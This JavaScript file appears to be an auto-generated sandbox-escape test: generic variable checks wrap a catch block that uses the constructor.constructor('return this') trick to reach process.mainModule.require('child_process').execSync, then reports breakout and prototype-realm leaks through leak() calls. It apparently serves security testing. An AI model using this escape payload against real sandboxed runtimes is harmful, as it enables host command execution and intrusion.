try {
    var a = 1;
    if (a !== 1) {
        $ERROR('#a');
    }
    var b = 1;
    if (b !== 1) {
        $ERROR('#b');
    }
    var c = 1;
    if (c !== 1) {
        $ERROR('#c');
    }
    var d = 1;
    if (d !== 1) {
        $ERROR('#d');
    }
    var e = 1;
    if (e !== 1) {
        $ERROR('#e');
    }
    var f = 1;
    if (f !== 1) {
        $ERROR('#f');
    }
    var g = 1;
    if (g !== 1) {
        $ERROR('#g');
    }
    var h = 1;
    if (h !== 1) {
        $ERROR('#h');
    }
    var i = 1;
    if (i !== 1) {
        $ERROR('#i');
    }
    var j = 1;
    if (j !== 1) {
        $ERROR('#j');
    }
    var k = 1;
    if (k !== 1) {
        $ERROR('#k');
    }
    var l = 1;
    if (l !== 1) {
        $ERROR('#l');
    }
    var m = 1;
    if (m !== 1) {
        $ERROR('#m');
    }
    var n = 1;
    if (n !== 1) {
        $ERROR('#n');
    }
    var o = 1;
    if (o !== 1) {
        $ERROR('#o');
    }
    var p = 1;
    if (p !== 1) {
        $ERROR('#p');
    }
    var q = 1;
    if (q !== 1) {
        $ERROR('#q');
    }
    var r = 1;
    if (r !== 1) {
        $ERROR('#r');
    }
    var s = 1;
    if (s !== 1) {
        $ERROR('#s');
    }
    var t = 1;
    if (t !== 1) {
        $ERROR('#t');
    }
    var u = 1;
    if (u !== 1) {
        $ERROR('#u');
    }
    var v = 1;
    if (v !== 1) {
        $ERROR('#v');
    }
    var w = 1;
    if (w !== 1) {
        $ERROR('#w');
    }
    var x = 1;
    if (x !== 1) {
        $ERROR('#x');
    }
    var y = 1;
    if (y !== 1) {
        $ERROR('#y');
    }
    var z = 1;
    if (z !== 1) {
        $ERROR('#z');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}